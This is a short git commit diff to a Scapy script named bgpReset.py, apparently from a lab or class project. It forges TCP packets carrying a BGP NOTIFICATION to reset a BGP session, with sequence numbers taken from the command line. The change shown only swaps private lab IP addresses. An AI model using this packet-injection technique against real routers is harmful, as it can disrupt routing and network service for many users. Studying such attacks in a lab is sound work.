5e61114419ea17370382842b4399c7a3bb6e4545
root <root@localhost.localdomain>
2021-04-28 19:45:58 +0000

    Update Code starting to work

--- Sprint1/bgpReset.py
+++ Sprint1/bgpReset.py
@@ -6,7 +6,7 @@ load_contrib('bgp')
 
 # Pass seq num, ack num, and source port on cmd line
 
-base= IP(src="192.168.4.2", dst="192.168.4.1", proto=6, ttl=1)
+base= IP(src="192.168.4.1", dst="192.168.4.2", proto=6, ttl=1)
 tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.argv[2]), flags="PA")
 
 #Type 3 is notification, marker is used for authentication, max hex for no auth(32 fs)
